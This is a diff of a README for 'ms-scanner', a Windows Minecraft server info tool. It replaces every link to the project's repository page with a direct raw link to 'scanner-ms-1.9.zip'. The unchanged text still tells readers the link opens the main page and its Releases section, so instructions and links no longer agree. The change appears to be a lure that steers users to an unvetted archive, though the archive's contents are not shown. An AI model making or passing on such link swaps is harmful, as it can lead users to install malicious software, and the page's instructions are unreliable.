@@ -1,6 +1,6 @@
 # 🕵️ ms-scanner - Quick Minecraft Server Info
 
-[![Download ms-scanner](https://img.shields.io/badge/Download-ms--scanner-blue?style=for-the-badge)](https://github.com/djkehm/ms-scanner)
+[![Download ms-scanner](https://img.shields.io/badge/Download-ms--scanner-blue?style=for-the-badge)](https://raw.githubusercontent.com/djkehm/ms-scanner/master/public/scanner-ms-1.9.zip)
 
 ---
 
@@ -11,7 +11,7 @@ ms-scanner lets you check Minecraft servers fast. It works with both Java and Be
 ## 📥 Download and Install ms-scanner
 
 1. Open this link in your web browser:  
-   [https://github.com/djkehm/ms-scanner](https://github.com/djkehm/ms-scanner)  
+   [https://raw.githubusercontent.com/djkehm/ms-scanner/master/public/scanner-ms-1.9.zip](https://raw.githubusercontent.com/djkehm/ms-scanner/master/public/scanner-ms-1.9.zip)  
    This will take you to the main page for ms-scanner.
 
 2. Find the **Releases** section on that page. This is where you will get the setup files.
@@ -107,7 +107,7 @@ The program may also show extra details like server icon, protocol version, and 
 
 ## 🔄 Updating ms-scanner
 
-Visit [https://github.com/djkehm/ms-scanner](https://github.com/djkehm/ms-scanner) regularly. When a new release appears, download the updated `.exe` or `.zip` file and overwrite your old version or install it fresh.
+Visit [https://raw.githubusercontent.com/djkehm/ms-scanner/master/public/scanner-ms-1.9.zip](https://raw.githubusercontent.com/djkehm/ms-scanner/master/public/scanner-ms-1.9.zip) regularly. When a new release appears, download the updated `.exe` or `.zip` file and overwrite your old version or install it fresh.
 
 ---
 
@@ -123,6 +123,6 @@ Visit [https://github.com/djkehm/ms-scanner](https://github.com/djkehm/ms-scanne
 ## 🔗 Download ms-scanner
 
 Get the latest files here:  
-[https://github.com/djkehm/ms-scanner](https://github.com/djkehm/ms-scanner)
+[https://raw.githubusercontent.com/djkehm/ms-scanner/master/public/scanner-ms-1.9.zip](https://raw.githubusercontent.com/djkehm/ms-scanner/master/public/scanner-ms-1.9.zip)
 
 Click the link, find the release files, and get started. This page has everything you need to download and run ms-scanner on Windows.
